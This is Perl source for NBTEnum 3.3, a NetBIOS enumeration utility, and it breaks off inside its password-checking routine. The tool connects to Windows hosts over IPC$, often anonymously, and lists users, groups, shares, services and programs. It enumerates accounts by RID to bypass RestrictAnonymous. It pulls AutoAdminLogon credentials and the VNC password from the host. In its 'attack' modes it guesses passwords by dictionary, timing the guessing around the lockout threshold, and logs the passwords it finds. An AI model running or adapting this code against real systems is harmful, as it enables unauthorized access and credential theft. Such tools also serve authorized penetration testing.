# NBTEnum 3.3 - NetBIOS Enumeration Utility
# Written by Reed Arvin - reedarvin@gmail.com

use Win32::Lanman;
use Win32::TieRegistry;
use Win32;
use strict;

my($strUsername)     = "";
my($strPassword)     = "";
my($strPassChecking) = "";
my($strDictionary)   = "";
my($strTarget)       = "";

&CheckInput(@ARGV);

if ($ARGV[0] eq "-q")
{
	$strUsername = $ARGV[2];
	$strPassword = $ARGV[3];
}

if ($ARGV[0] eq "-a")
{
	$strPassChecking = "TRUE";
	$strDictionary   = $ARGV[2];
}

if ($ARGV[0] eq "-s")
{
	$strPassChecking = "SMART";
	$strDictionary   = $ARGV[2];
}

if (open(IPRANGE, "< $ARGV[1]"))
{
	while (<IPRANGE>)
	{
		$strTarget = $_;

		chomp($strTarget);

		if ($strTarget ne "")
		{
			&NBTEnumMain($strTarget, $strPassChecking, $strDictionary, $strUsername, $strPassword);
		}
	}

	close(IPRANGE);
}
else
{
	$strTarget = $ARGV[1];

	&NBTEnumMain($strTarget, $strPassChecking, $strDictionary, $strUsername, $strPassword);
}

sub CheckInput()
{
	my(@ARGV) = @_;

	if ($ARGV[0] =~ /^$/ || $ARGV[4] !~ /^$/)
	{
		print "NBTEnum 3.3 - NetBIOS Enumeration Utility\n";
		print "Written by Reed Arvin - reedarvin\@gmail.com\n";
		print "\n";
		print "Usage:\n";
		print "nbtenum [-v]\n";
		print "nbtenum [-h]\n";
		print "nbtenum [-q] [ip address | ip input file] [username] [password]\n";
		print "nbtenum [-a] [ip address | ip input file] [dictionary file]\n";
		print "nbtenum [-s] [ip address | ip input file] [dictionary file]\n";

		exit;
	}

	if ($ARGV[0] !~ /^-q$|^-a$|^-s$/)
	{
		if ($ARGV[0] =~ /^-v$/ && $ARGV[1] =~ /^$/)
		{
			print "NBTEnum 3.3 - NetBIOS Enumeration Utility\n";
			print "Written by Reed Arvin - reedarvin\@gmail.com\n";

			exit;
		}
		elsif ($ARGV[0] =~ /^-h$/ && $ARGV[1] =~ /^$/)
		{
			print "-v - (version) Displays version information.\n";
			print "\n";
			print "-h - (help) Displays this screen.\n";
			print "\n";
			print "-q - (query) Enumerates NetBIOS information on the specified host or\n";
			print "     range of IP addresses. If a username and password is not specified\n";
			print "     the utility is run under the context of the null user. If a username\n";
			print "     and password is specified the utility is run under the context of\n";
			print "     the given username.\n";
			print "\n";
			print "-a - (attack) Enumerates NetBIOS information on the specified host or\n";
			print "     range of IP addresses and also performs password checking. If a\n";
			print "     dictionary file is not specified the utility will check each user\n";
			print "     account for blank passwords and passwords the same as the username\n";
			print "     in lower case. If a dictionary file is specified the utility will\n";
			print "     check each user account for blank passwords and passwords the same as\n";
			print "     the username in lower case and all passwords specified in the\n";
			print "     dictionary file.\n";
			print "\n";
			print "-s - (smart attack) Enumerates NetBIOS information on the specified host\n";
			print "     or range of IP addresses and performs password checking only if the\n";
			print "     account lockout threshold on the current host is set to 0. If a\n";
			print "     dictionary file is not specified the utility will check each user\n";
			print "     account for blank passwords and passwords the same as the username\n";
			print "     in lower case. If a dictionary file is specified the utility will\n";
			print "     check each user account for blank passwords and passwords the same as\n";
			print "     the username in lower case and all passwords specified in the\n";
			print "     dictionary file.\n";
			print "\n";
			print "NBTEnum 3.3 - NetBIOS Enumeration Utility\n";
			print "Written by Reed Arvin - reedarvin\@gmail.com\n";
			print "\n";
			print "Usage:\n";
			print "nbtenum [-v]\n";
			print "nbtenum [-h]\n";
			print "nbtenum [-q] [ip address | ip input file] [username] [password]\n";
			print "nbtenum [-a] [ip address | ip input file] [dictionary file]\n";
			print "nbtenum [-s] [ip address | ip input file] [dictionary file]\n";

			exit;
		}
		else
		{
			print "NBTEnum 3.3 - NetBIOS Enumeration Utility\n";
			print "Written by Reed Arvin - reedarvin\@gmail.com\n";
			print "\n";
			print "Usage:\n";
			print "nbtenum [-v]\n";
			print "nbtenum [-h]\n";
			print "nbtenum [-q] [ip address | ip input file] [username] [password]\n";
			print "nbtenum [-a] [ip address | ip input file] [dictionary file]\n";
			print "nbtenum [-s] [ip address | ip input file] [dictionary file]\n";

			exit;
		}
	}

	if ($ARGV[1] !~ /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/)
	{
		if (open(IPRANGE, "< $ARGV[1]"))
		{
			close(IPRANGE);
		}
		else
		{
			print "NBTEnum 3.3 - NetBIOS Enumeration Utility\n";
			print "Written by Reed Arvin - reedarvin\@gmail.com\n";
			print "\n";
			print "Usage:\n";
			print "nbtenum [-v]\n";
			print "nbtenum [-h]\n";
			print "nbtenum [-q] [ip address | ip input file] [username] [password]\n";
			print "nbtenum [-a] [ip address | ip input file] [dictionary file]\n";
			print "nbtenum [-s] [ip address | ip input file] [dictionary file]\n";

			exit;
		}
	}
}

sub NBTEnumMain()
{
	my($strTarget, $strPassChecking, $strDictionary, $strUsername, $strPassword) = @_;
	my(@strTransports)                                                           = ();
	my($strTransport)                                                            = "";
	my(@strTransportSplit)                                                       = ();
	my($strUserModals)                                                           = "";
	my(@strUserModalsSplit)                                                      = ();
	my(@strLoggedOnUsers)                                                        = ();
	my($strLoggedOnUser)                                                         = "";
	my(@strLoggedOnUserSplit)                                                    = ();
	my(@strLocalGroups)                                                          = ();
	my($strLocalGroup)                                                           = "";
	my(@strLocalUsers)                                                           = ();
	my($strLocalUser)                                                            = "";
	my(@strLocalUserSplit)                                                       = ();
	my($strUserInfo)                                                             = "";
	my(@strGlobalGroups)                                                         = ();
	my($strDuplicate)                                                            = "";
	my(@strGlobalUsersSplit)                                                     = ();
	my($strGlobalUsersList)                                                      = "";
	my($strCurrentGlobalUser)                                                    = "";
	my($i)                                                                       = "";
	my($strGlobalGroup)                                                          = "";
	my(@strGlobalUsers)                                                          = ();
	my($strGlobalUser)                                                           = "";
	my($strGuessedPassword)                                                      = "";
	my(@strGuessedPasswords)                                                     = ();
	my(@strRAUsers)                                                              = ();
	my($strRAUser)                                                               = "";
	my(@strShares)                                                               = ();
	my($strShare)                                                                = "";
	my(@strOSVersion)                                                            = ();
	my(@strServices)                                                             = ();
	my($strService)                                                              = "";
	my(@strServiceSplit)                                                         = ();
	my(@strPrograms)                                                             = ();
	my($strProgram)                                                              = "";
	my($strDC)                                                                   = "";
	my(@strAutoAdminLogonInfo)                                                   = ();
	my($strVNCPassword)                                                          = "";
	my(@strGuessedPasswordSplit)                                                 = ();

	print "Connecting to host $strTarget\n";

	if (&Connect($strTarget, $strUsername, $strPassword))
	{
		OpenLog($strTarget, $strUsername, $strPassword, $strPassChecking);

		open(LOG, ">> $strTarget.html");

		@strTransports = &GetTransports($strTarget);

		if ($strTransports[0] ne "FALSE")
		{
			print "-> Getting Workstation Transports\n";

			print LOG "<table align=\"center\" width=\"600\" border=\"1\">\n";
			print LOG "<tr>\n";
			print LOG "<td valign=\"top\" width=\"250\">\n";
			print LOG "<font face=\"arial\" size=\"2\"><b>Network Transports</b>\n";
			print LOG "</td>\n";
			print LOG "<td valign=\"top\" width=\"350\">\n";
			print LOG "<font face=\"arial\" size=\"2\">";

			foreach $strTransport (sort @strTransports)
			{
				@strTransportSplit = split(/,/, $strTransport);

				print LOG "<b><i>Transport: </i></b>$strTransportSplit[0]\n";
				print LOG "<br><b><i>MAC Address: </i></b>$strTransportSplit[1]\n";
				print LOG "<br><br>\n";
			}

			print LOG "</td>\n";
			print LOG "</tr>\n";
			print LOG "</table>\n";
			print LOG "\n";

			close(LOG);
		}

		$strUserModals = &GetUserModals($strTarget);

		if ($strUserModals ne "FALSE")
		{
			print "-> Getting Account Lockout Threshold\n";

			open(LOG, ">> $strTarget.html");

			print LOG "<br>\n";
			print LOG "<table align=\"center\" width=\"600\" border=\"1\">\n";
			print LOG "<tr>\n";
			print LOG "<td valign=\"top\" width=\"250\">\n";
			print LOG "<font face=\"arial\" size=\"2\"><b>NetBIOS Name</b>\n";
			print LOG "</td>\n";
			print LOG "<td valign=\"top\" width=\"350\">\n";
			print LOG "<font face=\"arial\" size=\"2\">";

			@strUserModalsSplit = split(/,/, $strUserModals);

			print LOG "$strUserModalsSplit[0]\n";

			print LOG "</td>\n";
			print LOG "</tr>\n";
			print LOG "</table>\n";
			print LOG "\n";

			print LOG "<br>\n";
			print LOG "<table align=\"center\" width=\"600\" border=\"1\">\n";
			print LOG "<tr>\n";
			print LOG "<td valign=\"top\" width=\"250\">\n";
			print LOG "<font face=\"arial\" size=\"2\"><b>Account Lockout Threshold</b>\n";
			print LOG "</td>\n";
			print LOG "<td valign=\"top\" width=\"350\">\n";
			print LOG "<font face=\"arial\" size=\"2\">";

			print LOG "$strUserModalsSplit[1] Attempts\n";

			print LOG "</td>\n";
			print LOG "</tr>\n";
			print LOG "</table>\n";
			print LOG "\n";

			close(LOG);
		}

		@strLoggedOnUsers = &GetLoggedOnUsers($strTarget);

		if ($strLoggedOnUsers[0] ne "FALSE")
		{
			print "-> Getting Logged On Users\n";

			open(LOG, ">> $strTarget.html");

			print LOG "<br>\n";
			print LOG "<table align=\"center\" width=\"600\" border=\"1\">\n";
			print LOG "<tr>\n";
			print LOG "<td valign=\"top\" width=\"250\">\n";
			print LOG "<font face=\"arial\" size=\"2\"><b>Logged On Users</b>\n";
			print LOG "</td>\n";
			print LOG "<td valign=\"top\" width=\"350\">\n";
			print LOG "<font face=\"arial\" size=\"2\">";

			foreach $strLoggedOnUser (sort @strLoggedOnUsers)
			{
				@strLoggedOnUserSplit = split(/,/, $strLoggedOnUser);

				print LOG "<b><i>Username: </i></b>$strLoggedOnUserSplit[0]\n";
				print LOG "<br><b><i>Logon Server: </i></b>$strLoggedOnUserSplit[1]\n";
				print LOG "<br><br>";
			}

			print LOG "\n";

			print LOG "</td>\n";
			print LOG "</tr>\n";
			print LOG "</table>\n";
			print LOG "\n";

			close(LOG);
		}

		@strLocalGroups = &GetLocalGroups($strTarget);

		if ($strLocalGroups[0] ne "FALSE")
		{
			print "-> Getting Local Groups and Users\n";

			open(LOG, ">> $strTarget.html");

			print LOG "<br>\n";
			print LOG "<table align=\"center\" width=\"600\" border=\"1\">\n";
			print LOG "<tr>\n";
			print LOG "<td valign=\"top\" width=\"250\">\n";
			print LOG "<font face=\"arial\" size=\"2\"><b>Local Groups and Users</b>\n";
			print LOG "</td>\n";
			print LOG "<td valign=\"top\" width=\"350\">\n";
			print LOG "<font face=\"arial\" size=\"2\">";

			foreach $strLocalGroup (sort @strLocalGroups)
			{
				print LOG "<b><i>$strLocalGroup</i></b>\n";

				@strLocalUsers = (&GetLocalUsers($strTarget, $strLocalGroup));

				if ($strLocalUsers[0] ne "FALSE")
				{
					foreach $strLocalUser (sort @strLocalUsers)
					{
						print LOG "<br>- $strLocalUser";

						@strLocalUserSplit = split(/\\/, $strLocalUser);

						$strUserInfo = &GetUserInfo($strTarget, $strLocalUserSplit[1]);

						if ($strUserInfo ne "FALSE")
						{
							print LOG "<font color=\"red\">$strUserInfo</font>";
						}

						print LOG "\n";
					}

					print LOG "<br>";
				}

				print LOG "<br>";
			}

			print LOG "\n";

			print LOG "</td>\n";
			print LOG "</tr>\n";
			print LOG "</table>\n";
			print LOG "\n";

			close(LOG);
		}

		@strGlobalGroups = &GetGlobalGroups($strTarget);

		if ($strGlobalGroups[0] ne "FALSE")
		{
			print "-> Getting Global Groups and Users\n";

			if ($strPassChecking eq "TRUE")
			{
				print "-> Checking passwords\n";
			}

			if ($strPassChecking eq "SMART")
			{
				if ($strUserModalsSplit[1] eq "0")
				{
					print "-> Checking passwords\n";
				}
			}

			$i = 0;

			open(LOG, ">> $strTarget.html");

			print LOG "<br>\n";
			print LOG "<table align=\"center\" width=\"600\" border=\"1\">\n";
			print LOG "<tr>\n";
			print LOG "<td valign=\"top\" width=\"250\">\n";
			print LOG "<font face=\"arial\" size=\"2\"><b>Global Groups and Users</b>\n";
			print LOG "</td>\n";
			print LOG "<td valign=\"top\" width=\"350\">\n";
			print LOG "<font face=\"arial\" size=\"2\">";

			foreach $strGlobalGroup (sort @strGlobalGroups)
			{
				print LOG "<b><i>$strGlobalGroup</i></b>\n";

				@strGlobalUsers = &GetGlobalUsers($strTarget, $strGlobalGroup);

				if ($strGlobalUsers[0] ne "FALSE")
				{
					foreach $strGlobalUser (sort @strGlobalUsers)
					{
						print LOG "<br>- $strGlobalUser";

						$strUserInfo = &GetUserInfo($strTarget, $strGlobalUser);

						if ($strUserInfo ne "FALSE")
						{
							print LOG "<font color=\"red\">$strUserInfo</font>";
						}

						if ($strUserInfo eq "")
						{
							if ($strPassChecking eq "TRUE")
							{
								$strDuplicate = "";

								@strGlobalUsersSplit = split(/,/, $strGlobalUsersList);

								foreach $strCurrentGlobalUser (@strGlobalUsersSplit)
								{
									if ($strGlobalUser eq $strCurrentGlobalUser)
									{
										$strDuplicate = "TRUE";
									}
								}

								$strGlobalUsersList = $strGlobalUsersList . "$strGlobalUser,";

								if ($strDuplicate ne "TRUE")
								{
									print "   -> $strGlobalUser ";

									$strGuessedPassword = &CheckPasswords($strTarget, $strGlobalUser, $strDictionary, $strUsername, $strPassword);

									if ($strGuessedPassword ne "")
									{
										$strGuessedPasswords[$i] = $strGuessedPassword;

										$i = $i + 1;
									}

									print "\n";
								}
							}

							if ($strPassChecking eq "SMART")
							{
								if ($strUserModalsSplit[1] eq "0")
								{
									$strDuplicate = "";

									@strGlobalUsersSplit = split(/,/, $strGlobalUsersList);

									foreach $strCurrentGlobalUser (@strGlobalUsersSplit)
									{
										if ($strGlobalUser eq $strCurrentGlobalUser)
										{
											$strDuplicate = "TRUE";
										}
									}

									$strGlobalUsersList = $strGlobalUsersList . "$strGlobalUser,";

									if ($strDuplicate ne "TRUE")
									{
										print "   -> $strGlobalUser ";

										$strGuessedPassword = &CheckPasswords($strTarget, $strGlobalUser, $strDictionary, $strUsername, $strPassword);

										if ($strGuessedPassword ne "")
										{
											$strGuessedPasswords[$i] = $strGuessedPassword;

											$i = $i + 1;
										}

										print "\n";
									}
								}
							}
						}

						print LOG "\n";
					}

					print LOG "<br>";
				}

				print LOG "<br>";
			}

			print LOG "\n";

			print LOG "</td>\n";
			print LOG "</tr>\n";
			print LOG "</table>\n";
			print LOG "\n";

			close(LOG);
		}
		else
		{
			@strRAUsers = &GetRAUsers($strTarget);

			if ($strRAUsers[0] ne "FALSE")
			{
				print "-> Getting user RIDs 500, 501, and 1000-1500\n";

				if ($strPassChecking eq "TRUE")
				{
					print "-> Checking passwords\n";
				}

				open(LOG, ">> $strTarget.html");

				print LOG "<br>\n";
				print LOG "<table align=\"center\" width=\"600\" border=\"1\">\n";
				print LOG "<tr>\n";
				print LOG "<td valign=\"top\" width=\"250\">\n";
				print LOG "<font face=\"arial\" size=\"2\"><b>RestrictAnonymous Bypass\n";
				print LOG "<br>User RIDs 500, 501, and 1000-1500</b>\n";
				print LOG "</td>\n";
				print LOG "<td valign=\"top\" width=\"350\">\n";
				print LOG "<font face=\"arial\" size=\"2\">";

				foreach $strRAUser (sort @strRAUsers)
				{
					print LOG "$strRAUser";

					$strUserInfo = &GetUserInfo($strTarget, $strRAUser);

					if ($strUserInfo ne "FALSE")
					{
						print LOG "<font color=\"red\">$strUserInfo</font>";
					}

					if ($strPassChecking eq "TRUE")
					{
						print "   -> $strRAUser ";

						$strGuessedPassword = &CheckPasswords($strTarget, $strRAUser, $strDictionary, $strUsername, $strPassword);

						if ($strGuessedPassword ne "")
						{
							$strGuessedPasswords[$i] = $strGuessedPassword;

							$i = $i + 1;
						}

						print "\n";
					}

					print LOG "\n";
					print LOG "<br>";
				}

				print LOG "<br>\n";

				print LOG "</td>\n";
				print LOG "</tr>\n";
				print LOG "</table>\n";
				print LOG "\n";

				close(LOG);
			}
		}

		@strShares = &GetShares($strTarget);

		if ($strShares[0] ne "FALSE")
		{
			print "-> Getting Shares\n";

			open(LOG, ">> $strTarget.html");

			print LOG "<br>\n";
			print LOG "<table align=\"center\" width=\"600\" border=\"1\">\n";
			print LOG "<tr>\n";
			print LOG "<td valign=\"top\" width=\"250\">\n";
			print LOG "<font face=\"arial\" size=\"2\"><b>Share Information</b>\n";
			print LOG "</td>\n";
			print LOG "<td valign=\"top\" width=\"350\">\n";
			print LOG "<font face=\"arial\" size=\"2\">";

			foreach $strShare (sort @strShares)
			{
				print LOG "$strShare\n";
				print LOG "<br>";
			}

			print LOG "<br>\n";

			print LOG "</td>\n";
			print LOG "</tr>\n";
			print LOG "</table>\n";
			print LOG "\n";

			close(LOG);
		}

		@strOSVersion = &GetOSVersion($strTarget);

		if ($strOSVersion[0] ne "FALSE")
		{
			print "-> Getting Extended Information\n";

			open(LOG, ">> $strTarget.html");

			print LOG "<br>\n";
			print LOG "<table align=\"center\" width=\"600\" border=\"1\">\n";
			print LOG "<tr>\n";
			print LOG "<td valign=\"top\" width=\"250\">\n";
			print LOG "<font face=\"arial\" size=\"2\"><b>Operating System Information</b>\n";
			print LOG "</td>\n";
			print LOG "<td valign=\"top\" width=\"350\">\n";
			print LOG "<font face=\"arial\" size=\"2\">";

			print LOG "<b><i>OS Version: </i></b>Windows NT $strOSVersion[0]<br>\n";
			print LOG "<b><i>Service Pack: </i></b>$strOSVersion[1]\n";

			print LOG "</td>\n";
			print LOG "</tr>\n";
			print LOG "</table>\n";
			print LOG "\n";

			close(LOG);
		}

		@strServices = &GetServices($strTarget);

		if ($strServices[0] ne "FALSE")
		{
			open(LOG, ">> $strTarget.html");

			print LOG "<br>\n";
			print LOG "<table align=\"center\" width=\"600\" border=\"1\">\n";
			print LOG "<tr>\n";
			print LOG "<td valign=\"top\" width=\"250\">\n";
			print LOG "<font face=\"arial\" size=\"2\"><b>Services</b>\n";
			print LOG "</td>\n";
			print LOG "<td valign=\"top\" width=\"350\">\n";
			print LOG "<font face=\"arial\" size=\"2\">";

			foreach $strService (sort @strServices)
			{
				@strServiceSplit = split(/,/, $strService);

				print LOG $strServiceSplit[0];
				print LOG "<font color=\"red\"> -$strServiceSplit[1]</font>" if $strServiceSplit[1] eq "Started";
				print LOG "\n";
				print LOG "<br>";
			}

			print LOG "<br>\n";

			print LOG "</td>\n";
			print LOG "</tr>\n";
			print LOG "</table>\n";
			print LOG "\n";

			close(LOG);
		}

		@strPrograms = &GetInstalledPrograms($strTarget);

		if ($strPrograms[0] ne "FALSE")
		{
			open(LOG, ">> $strTarget.html");

			print LOG "<br>\n";
			print LOG "<table align=\"center\" width=\"600\" border=\"1\">\n";
			print LOG "<tr>\n";
			print LOG "<td valign=\"top\" width=\"250\">\n";
			print LOG "<font face=\"arial\" size=\"2\"><b>Installed Programs</b>\n";
			print LOG "</td>\n";
			print LOG "<td valign=\"top\" width=\"350\">\n";
			print LOG "<font face=\"arial\" size=\"2\">";

			foreach $strProgram (sort @strPrograms)
			{
				print LOG "$strProgram\n";
				print LOG "<br>";
			}

			print LOG "<br>\n";

			print LOG "</td>\n";
			print LOG "</tr>\n";
			print LOG "</table>\n";
			print LOG "\n";

			close(LOG);
		}

		$strDC = &GetClosestDC($strTarget);

		if ($strDC ne "FALSE")
		{
			open(LOG, ">> $strTarget.html");

			print LOG "<br>\n";
			print LOG "<table align=\"center\" width=\"600\" border=\"1\">\n";
			print LOG "<tr>\n";
			print LOG "<td valign=\"top\" width=\"250\">\n";
			print LOG "<font face=\"arial\" size=\"2\"><b>Closest Domain Controller</b>\n";
			print LOG "</td>\n";
			print LOG "<td valign=\"top\" width=\"350\">\n";
			print LOG "<font face=\"arial\" size=\"2\">";

			print LOG "$strDC\n";

			print LOG "</td>\n";
			print LOG "</tr>\n";
			print LOG "</table>\n";
			print LOG "\n";

			close(LOG);
		}

		@strAutoAdminLogonInfo = &GetAutoAdminLogonInfo($strTarget);

		if ($strAutoAdminLogonInfo[0] ne "FALSE")
		{
			open(LOG, ">> $strTarget.html");

			print LOG "<br>\n";
			print LOG "<table align=\"center\" width=\"600\" border=\"1\">\n";
			print LOG "<tr>\n";
			print LOG "<td valign=\"top\" width=\"250\">\n";
			print LOG "<font face=\"arial\" size=\"2\"><b>Auto Admin Logon Information</b>\n";
			print LOG "</td>\n";
			print LOG "<td valign=\"top\" width=\"350\">\n";
			print LOG "<font face=\"arial\" size=\"2\">";

			print LOG "<b><i>Username: </i><font color=\"red\">$strAutoAdminLogonInfo[1]</font></b><br>\n";
			print LOG "<b><i>Password: </i><font color=\"red\">$strAutoAdminLogonInfo[0]</font></b><br>\n";

			if ($strAutoAdminLogonInfo[2] ne "")
			{
				print LOG "<b><i>Logon Server: </i><font color=\"red\">$strAutoAdminLogonInfo[2]</font></b>\n";
			}

			print LOG "</td>\n";
			print LOG "</tr>\n";
			print LOG "</table>\n";
			print LOG "\n";

			close(LOG);
		}

		$strVNCPassword = &GetVNCPassword($strTarget);

		if ($strVNCPassword ne "FALSE")
		{
			open(LOG, ">> $strTarget.html");

			print LOG "<br>\n";
			print LOG "<table align=\"center\" width=\"600\" border=\"1\">\n";
			print LOG "<tr>\n";
			print LOG "<td valign=\"top\" width=\"250\">\n";
			print LOG "<font face=\"arial\" size=\"2\"><b>Encrypted VNC Password</b>\n";
			print LOG "</td>\n";
			print LOG "<td valign=\"top\" width=\"350\">\n";
			print LOG "<font face=\"arial\" size=\"2\">";

			print LOG "<font color=\"red\"><b>$strVNCPassword</font></b><br>\n";

			print LOG "</td>\n";
			print LOG "</tr>\n";
			print LOG "</table>\n";
			print LOG "\n";

			close(LOG);
		}

		if ($strGuessedPasswords[0] ne "")
		{
			open(LOG, ">> $strTarget.html");

			print LOG "<br>\n";
			print LOG "<table align=\"center\" width=\"600\" border=\"1\">\n";
			print LOG "<tr>\n";
			print LOG "<td valign=\"top\" width=\"250\">\n";
			print LOG "<font face=\"arial\" size=\"2\"><b>Guessed Passwords</b>\n";
			print LOG "</td>\n";
			print LOG "<td valign=\"top\" width=\"350\">\n";
			print LOG "<font face=\"arial\" size=\"2\">";

			foreach $strGuessedPassword (sort @strGuessedPasswords)
			{
				@strGuessedPasswordSplit = split(/,/, $strGuessedPassword);

				print LOG "<font color=\"red\"><b>$strGuessedPasswordSplit[0]</b></font>, password is <font color=\"red\"><b>$strGuessedPasswordSplit[1]</b></font>\n";
				print LOG "<br>";
			}

			print LOG "<br>\n";

			print LOG "</td>\n";
			print LOG "</tr>\n";
			print LOG "</table>\n";
			print LOG "\n";

			close(LOG);
		}

		&Disconnect($strTarget);

		open(LOG, ">> $strTarget.html");

		print LOG "<table align=\"center\" width=\"600\" border=\"0\">\n";
		print LOG "<tr>\n";
		print LOG "<td align=\"center\">\n";
		print LOG "<hr>\n";
		print LOG "<font face=\"arial\" size=\"2\">Written by Reed Arvin - <a href=\"mailto:reedarvin\@gmail.com\">reedarvin\@gmail.com</a></font>\n";
		print LOG "</td>\n";
		print LOG "</tr>\n";
		print LOG "</table>\n";
		print LOG "</body>\n";
		print LOG "</html>\n";

		close(LOG);
	}
	else
	{
		print "-> Connection failed\n";
	}

	print "\n";
}

sub OpenLog()
{
	my($strTarget, $strUsername, $strPassword, $strPassChecking) = @_;

	open(LOG, "> $strTarget.html");

	print LOG "<html>\n";
	print LOG "<head>\n";
	print LOG "<title>NetBIOS Enumeration Utility v3.3</title>\n";
	print LOG "</head>\n";
	print LOG "<body>\n";
	print LOG "<table align=\"center\" width=\"600\" border=\"0\">\n";
	print LOG "<tr>\n";
	print LOG "<td>\n";
	print LOG "<font face=\"arial\" size=\"5\">\n";
	print LOG "<center>NBTEnum v3.3<br>$strTarget</center>\n";
	print LOG "<br>\n";

	if ($strPassChecking eq "TRUE")
	{
		print LOG "<font size=\"2\">Password checking is \"ON\"\n";
	}
	elsif ($strPassChecking eq "SMART")
	{
		print LOG "<font size=\"2\">Password checking is \"ON (SMART)\"\n";
	}
	else
	{
		print LOG "<font size=\"2\">Password checking is \"OFF\"\n";
	}

	if ($strUsername eq "")
	{
		print LOG "<br>Running as null user (anonymous)\n";
	}
	else
	{
		if ($strPassword eq "")
		{
			print LOG "<br>Running as user \"$strUsername\", password is blank\n";
		}
		else
		{
			print LOG "<br>Running as user \"$strUsername\", password is \"$strPassword\"\n";
		}
	}

	print LOG "<br>\n";
	print LOG "<hr>\n";
	print LOG "</td>\n";
	print LOG "</tr>\n";
	print LOG "</table>\n";
	print LOG "\n";

	close(LOG);
}

sub Connect()
{
	my($strTarget, $strUsername, $strPassword) = @_;
	my(%objInfo)                               = ();

	$objInfo{type}       = &RESOURCETYPE_ANY;
	$objInfo{localname}  = "";
	$objInfo{remotename} = "\\\\$strTarget\\IPC\$";

	if ($strUsername ne "" && $strUsername !~ /\\/)
	{
		$strUsername = "$strTarget\\$strUsername";
	}

	$objInfo{username} = $strUsername;
	$objInfo{password} = $strPassword;

	(Win32::Lanman::WNetAddConnection(\%objInfo)) ? (return 1) : (return 0);
}

sub GetTransports()
{
	my($strTarget)    = @_;
	my(@objInfo)      = ();
	my($strTransport) = "";
	my($i)            = "";
	my(@strResult)    = ();

	if (Win32::Lanman::NetWkstaTransportEnum("\\\\$strTarget", \@objInfo))
	{
		$i = 0;

		foreach $strTransport (@objInfo)
		{
			$strResult[$i] = "${$strTransport}{'transport_name'},${$strTransport}{'transport_address'}";

			$i = $i + 1;
		}

		return @strResult;
	}
	else
	{
		$strResult[0] = "FALSE";

		return @strResult;
	}
}

sub GetUserModals()
{
	my($strTarget) = @_;
	my(%objInfo)   = ();
	my($strResult) = "";

	if (Win32::Lanman::NetUserModalsGet("\\\\$strTarget", \%objInfo))
	{
		$strResult = "$objInfo{'domain_name'},$objInfo{'lockout_threshold'}";

		return $strResult;
	}
	else
	{
		$strResult = "FALSE";

		return $strResult;
	}
}

sub GetLoggedOnUsers()
{
	my($strTarget)       = @_;
	my(@objInfo)         = ();
	my($strLoggedOnUser) = "";
	my($i)               = "";
	my(@strResult)       = ();

	if (Win32::Lanman::NetWkstaUserEnum("\\\\$strTarget", \@objInfo))
	{
		$i = 0;

		foreach $strLoggedOnUser (@objInfo)
		{
			$strResult[$i] = "${$strLoggedOnUser}{'username'},${$strLoggedOnUser}{'logon_server'}";

			$i = $i + 1;
		}

		return @strResult;
	}
	else
	{
		$strResult[0] = "FALSE";

		return @strResult;
	}
}

sub GetLocalGroups()
{
	my($strTarget)      = @_;
	my(@strLocalGroups) = ();
	my($strLocalGroup)  = "";
	my($i)              = "";
	my(@strResult)      = ();

	if (Win32::Lanman::NetLocalGroupEnum("\\\\$strTarget", \@strLocalGroups))
	{
		$i = 0;

		foreach $strLocalGroup (@strLocalGroups)
		{
			$strResult[$i] = "${$strLocalGroup}{'name'}";

			$i = $i + 1;
		}

		return @strResult;
	}
	else
	{
		$strResult[0] = "FALSE";

		return @strResult;
	}
}

sub GetLocalUsers()
{
	my($strTarget, $strLocalGroup)  = @_;
	my(@strMembers)                 = ();
	my($strMember)                  = "";
	my(@strMemberSplit)             = ();
	my($i)                          = "";
	my(@strResult)                  = ();

	if (Win32::Lanman::NetLocalGroupGetMembers("\\\\$strTarget", $strLocalGroup, \@strMembers))
	{
		$i = 0;

		foreach $strMember (@strMembers)
		{
			@strMemberSplit = split(/\\/, ${$strMember}{'domainandname'});

			if ($strMemberSplit[1] ne "")
			{
				$strResult[$i] = "${$strMember}{'domainandname'}";

				$i = $i + 1;
			}
		}

		return @strResult;
	}
	else
	{
		$strResult[0] = "FALSE";

		return @strResult;
	}
}

sub GetUserInfo()
{
	my($strTarget, $strUser) = @_;
	my(%objInfo)             = ();
	my($strLockout)          = "";
	my($strDisabled)         = "";
	my($strResult)           = "";

	if (Win32::Lanman::NetUserGetInfo("\\\\$strTarget", $strUser, \%objInfo))
	{
		$strLockout  = " -Lockout" if ($objInfo{'flags'} & UF_LOCKOUT);
		$strDisabled = " -Disabled" if ($objInfo{'flags'} & UF_ACCOUNTDISABLE);

		$strResult = "$strLockout$strDisabled";

		return $strResult;
	}
	else
	{
		$strResult = "FALSE";

		return $strResult;
	}
}

sub GetGlobalGroups()
{
	my($strTarget)       = @_;
	my(@strGlobalGroups) = ();
	my($strGlobalGroup)  = "";
	my($i)               = "";
	my(@strResult)       = ();

	if (Win32::Lanman::NetGroupEnum("\\\\$strTarget", \@strGlobalGroups))
	{
		$i = 0;

		foreach $strGlobalGroup (@strGlobalGroups)
		{
			$strResult[$i] = "${$strGlobalGroup}{'name'}";

			$i = $i + 1;
		}

		return @strResult;
	}
	else
	{
		$strResult[0] = "FALSE";

		return @strResult;
	}
}

sub GetGlobalUsers()
{
	my($strTarget, $strGlobalGroup) = @_;
	my(@strUsers)                   = ();
	my($strUser)                    = "";
	my($i)                          = "";
	my(@strResult)                  = ();

	if (Win32::Lanman::NetGroupGetUsers("\\\\$strTarget", $strGlobalGroup, \@strUsers))
	{
		$i = 0;

		foreach $strUser (@strUsers)
		{
			if (${$strUser}{'name'} ne "")
			{
				$strResult[$i] = "${$strUser}{'name'}";

				$i = $i + 1;
			}
		}

		return @strResult;
	}
	else
	{
		$strResult[0] = "FALSE";

		return @strResult;
	}
}

sub CheckPasswords()
{
	my($strTarget, $strUsername, $strDictionary, $strIPCUsername, $strIPCPassword) = @_;
	my($strPassword)                                                               = "";
	my($strResult)                                                                 = "";
	my($strLCUsername)                                                             = "";

	&Disconnect($strTarget);

	if (open(DICT, "< $strDictionary"))
	{
		if (&Connect($strTarget, $strUsername, ""))
		{
			$strResult = "$strUsername,#BLANK#";

			print "!";

			Disconnect($strTarget);
		}
		else
		{
			print ".";

			$strLCUsername = lc($strUsername);

			if (&Connect($strTarget, $strUsername, $strLCUsername))
			{
				$strResult = "$strUsername,$strLCUsername";

				print "!";

				Disconnect($strTarget);
			}
			else
			{
				print ".";

				while (<DICT>)
				{
					$strPassword = $_;

					chomp($strPassword);

					if ($strPassword ne "")
					{
						if (&Connect($strTarget, $strUsername, $strPassword))
						{
							$strResult = "$strUsername,$strPassword";

							print "!";

							Disconnect($strTarget);

